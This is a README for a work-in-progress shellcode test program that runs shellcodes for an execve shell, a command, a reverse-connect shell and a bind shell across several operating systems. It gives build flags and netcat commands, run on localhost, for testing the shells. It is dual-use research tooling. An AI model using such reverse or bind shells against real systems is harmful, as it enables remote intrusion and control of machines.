
# About

This is work in progress so if you decide to fork or try running codes and they fail, just bear in mind it's not really intended for anyone else to use right now.

# Usage

    ./t2 -h

	  Target OS: x86-64 LINUX
	  usage: test -s <number> -p <port> -a <ip address> -c <command>
	
	  -c <command>  Command to execute
	  -s <number>   Shellcode to execute (see table below)
	  -p <port>     Port to use to bind/reverse shell (default is 1234)
	  -a <ip>       Remote ipv4 address for reverse shell (default is localhost)
	
	  Number  Description                                              Size
	  ======  ===========                                              ========
	  0       execve("/bin/sh", {"/bin/sh", NULL}, 0)                  22 bytes
	  1       execve("/bin/sh", {"/bin/sh", "-c", <cmd>, NULL}, 0)     39 bytes
	  2       socket(), connect(), execve("/bin/sh")                   67 bytes
	  3       socket(), bind(), listen(), accept(), execve("/bin/sh")  79 bytes

# Mac OSX x86-64

Compile with OSX defined

    gcc -DOSX t2.c -ot2
  
# Solaris x86
    
    gcc -DSX86 t2.c -ot2 -lnsl -lsocket

# BSD x86 or x86-64

	gcc -DBSD32 t2.c -ot2
    gcc -DBSD t2.c -ot2

# Linux x86 or x86-64
    
    gcc -DLINUX32 t2.c -ot2
    gcc t2.c -ot2
    
# Testing shells
    
For reverse connect shell (2). Have netcat or ncat listen on port 1234
    
    ncat -vl4 localhost 1234
    nc -vl 1234

Then execute
  
    ./t2 -s2  
  
For the bind shell(3). Execute

    ./t2 -s3
  
Then try connect: 

    nc -v localhost 1234
    ncat -v4 localhost 1234

When connected, you won't actually see anything since it's not a pty or interactive shell. Type something like ls -asl and you'll receive a detailed directory listing.
    
# Author

[@odzhancode](https://www.twitter.com/odzhancode "Follow me on Twitter")